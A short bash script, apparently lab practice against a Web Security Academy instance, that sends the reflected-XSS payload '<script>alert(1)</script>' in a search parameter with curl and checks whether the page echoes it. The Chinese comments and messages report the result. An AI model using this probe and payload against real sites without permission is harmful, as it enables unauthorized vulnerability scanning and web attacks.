#!/bin/bash

set -euo pipefail

XSSX(){	
	local cmd="$1"
	cmd=${cmd:-https://target.com/search?q=}
	local ib="<script>alert(1)</script>"  #哦后面是它的输入
	local ci="$cmd$ib"

	sd=$(curl -s --connect-timeout 5 "$ci" 2>/dev/null)
	#判断是否输出了<script>alert(1)</script>
	if echo "$sd" | grep -qF "$ib"; then
		echo "目标$cmd完整返回了内容，意思被注入了反射性XSS"
	else
		echo "目标无返回内容，未检出反射性XSS"
	fi
}

echo "默认目标是：https://target.com/search?q="
XSSX "https://0a5400c603d83c40b2e1699200f9002b.web-security-academy.net/?search="

